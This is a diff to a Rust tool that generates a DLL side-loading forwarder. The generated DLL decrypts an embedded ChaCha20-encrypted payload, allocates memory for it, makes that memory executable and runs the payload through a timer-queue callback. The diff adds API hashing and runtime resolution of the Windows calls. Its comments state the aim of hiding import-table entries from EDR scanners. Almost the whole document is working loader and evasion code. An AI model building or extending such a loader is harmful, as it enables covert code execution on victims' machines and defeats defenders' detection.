@@ -160,10 +160,38 @@ pub unsafe extern "system" fn {}() {{
 pub unsafe extern "system" fn {}() {{
     let real_dll = string_crypt::enc_str!("real_{}");
     let export_name = string_crypt::enc_str!("{}");
-    
-    let lib = winapi::um::libloaderapi::LoadLibraryA(real_dll.as_ptr() as _);
+
+    // P2-19: Resolve LoadLibraryA and GetProcAddress via pe_resolve
+    // at runtime to avoid IAT entries in the generated DLL.
+    let k32_base = match pe_resolve::get_module_handle_by_hash(
+        pe_resolve::hash_str(b"kernel32.dll\0")
+    ) {{
+        Some(b) => b,
+        None => return,
+    }};
+    let load_lib_addr = match pe_resolve::get_proc_address_by_hash(
+        k32_base,
+        pe_resolve::hash_str(b"LoadLibraryA\0"),
+    ) {{
+        Some(a) => a,
+        None => return,
+    }};
+    let get_proc_addr = match pe_resolve::get_proc_address_by_hash(
+        k32_base,
+        pe_resolve::hash_str(b"GetProcAddress\0"),
+    ) {{
+        Some(a) => a,
+        None => return,
+    }};
+
+    let load_lib: extern "system" fn(*const i8) -> *mut std::ffi::c_void =
+        std::mem::transmute(load_lib_addr);
+    let get_proc: extern "system" fn(*mut std::ffi::c_void, *const i8) -> *mut std::ffi::c_void =
+        std::mem::transmute(get_proc_addr);
+
+    let lib = load_lib(real_dll.as_ptr() as _);
     if !lib.is_null() {{
-        let proc = winapi::um::libloaderapi::GetProcAddress(lib, export_name.as_ptr() as _);
+        let proc = get_proc(lib, export_name.as_ptr() as _);
         if !proc.is_null() {{
             let f: extern "system" fn() = std::mem::transmute(proc);
             f();
@@ -197,13 +225,21 @@ pub unsafe extern "system" fn {}() {{
     let code = format!(
         r#"
 // auto-generated DLL side-loading forwarder
+// P2-19: All Win32 API calls resolved at runtime via pe_resolve to avoid
+// static IAT entries that would be visible to EDR scanners.
 use winapi::um::winnt::DLL_PROCESS_ATTACH;
-use winapi::um::libloaderapi::DisableThreadLibraryCalls;
 use winapi::shared::minwindef::{{HINSTANCE, DWORD, LPVOID}};
-use winapi::um::memoryapi::VirtualAlloc;
 use winapi::um::winnt::{{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ}};
 
 {}
+
+/// Resolve a kernel32 export by name at runtime (no IAT entry).
+unsafe fn resolve_k32(name: &[u8]) -> Option<usize> {{
+    let base = pe_resolve::get_module_handle_by_hash(
+        pe_resolve::hash_str(b"kernel32.dll\0"),
+    )?;
+    pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(name))
+}}
 
 extern "system" fn payload_callback(param: LPVOID, _timer_or_wait_fired: winapi::um::winnt::BOOLEAN) {{
     unsafe {{
@@ -333,7 +369,14 @@ fn chacha20_decrypt(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> ::std::vec
 #[allow(non_snake_case)]
 pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOID) -> i32 {{
     if reason == DLL_PROCESS_ATTACH {{
-        unsafe {{ DisableThreadLibraryCalls(hinst); }}
+        // P2-19: Resolve all Win32 APIs at runtime via pe_resolve — zero IAT entries.
+        unsafe {{
+            // DisableThreadLibraryCalls
+            if let Some(addr) = resolve_k32(b"DisableThreadLibraryCalls\0") {{
+                let f: extern "system" fn(HINSTANCE) -> i32 = std::mem::transmute(addr);
+                f(hinst);
+            }}
+        }}
         
         let ct_payload: [u8; {}] = [{}];
         let chacha_key: [u8; 32] = [{}];
@@ -342,35 +385,49 @@ pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOI
         let mut pt_payload = chacha20_decrypt(&ct_payload, &chacha_key, &chacha_nonce);
 
         unsafe {{
-            let mem = VirtualAlloc(
-                std::ptr::null_mut(),
-                pt_payload.len(),
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_READWRITE,
-            );
+            // VirtualAlloc
+            let mem = match resolve_k32(b"VirtualAlloc\0") {{
+                Some(addr) => {{
+                    let f: extern "system" fn(LPVOID, usize, u32, u32) -> LPVOID =
+                        std::mem::transmute(addr);
+                    f(std::ptr::null_mut(), pt_payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+                }}
+                None => std::ptr::null_mut(),
+            }};
             
             if !mem.is_null() {{
                 std::ptr::copy_nonoverlapping(pt_payload.as_ptr(), mem as _, pt_payload.len());
                 
-                let mut old_protect = 0;
-                winapi::um::memoryapi::VirtualProtect(
-                    mem, 
-                    pt_payload.len(), 
-                    PAGE_EXECUTE_READ, 
-                    &mut old_protect
-                );
+                // VirtualProtect
+                let mut old_protect = 0u32;
+                if let Some(addr) = resolve_k32(b"VirtualProtect\0") {{
+                    let f: extern "system" fn(LPVOID, usize, u32, *mut u32) -> i32 =
+                        std::mem::transmute(addr);
+                    f(mem, pt_payload.len(), PAGE_EXECUTE_READ, &mut old_protect);
+                }}
 
-                // Queue via Threadpool instead of direct thread
+                // CreateTimerQueueTimer — resolved from kernel32 at runtime.
                 let mut timer: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
-                winapi::um::threadpoollegacyapiset::CreateTimerQueueTimer(
-                    &mut timer, 
-                    std::ptr::null_mut(), 
-                    Some(payload_callback), 
-                    mem as LPVOID, 
-                    0, 
-                    0, 
-                    winapi::um::winnt::WT_EXECUTEINTIMERTHREAD
-                );
+                if let Some(addr) = resolve_k32(b"CreateTimerQueueTimer\0") {{
+                    let f: extern "system" fn(
+                        *mut winapi::shared::ntdef::HANDLE,
+                        winapi::shared::ntdef::HANDLE,
+                        Option<unsafe extern "system" fn(LPVOID, winapi::um::winnt::BOOLEAN)>,
+                        LPVOID,
+                        u32,
+                        u32,
+                        u32,
+                    ) -> i32 = std::mem::transmute(addr);
+                    f(
+                        &mut timer, 
+                        std::ptr::null_mut(), 
+                        Some(payload_callback), 
+                        mem as LPVOID, 
+                        0, 
+                        0, 
+                        winapi::um::winnt::WT_EXECUTEINTIMERTHREAD,
+                    );
+                }}
             }}
         }}
     }}
@@ -387,8 +444,26 @@ pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOI
     fs::write("side_loaded.rs", code).unwrap();
     let def_content = format!("LIBRARY {}\nEXPORTS\n{}", target_dll, def_entries);
     fs::write("side_loaded.def", def_content).unwrap();
+
+    // P2-19: Generate Cargo.toml with pe_resolve dependency (required for
+    // runtime-resolved Win32 API calls that replace static IAT entries).
+    let cargo_toml = r#"[package]
+name = "side_loaded"
+version = "0.1.0"
+edition = "2021"
+
+[lib]
+crate-type = ["cdylib"]
+
+[dependencies]
+winapi = { version = "0.3", features = ["winnt", "minwindef", "memoryapi", "libloaderapi"] }
+string_crypt = { path = "../string_crypt" }
+pe_resolve = { path = "../pe_resolve" }
+"#;
+    fs::write("Cargo.toml", cargo_toml).unwrap();
+
     println!(
-        "Generated side_loaded.rs and side_loaded.def for {}",
+        "Generated side_loaded.rs, side_loaded.def, and Cargo.toml for {}",
         target_dll
     );
 }
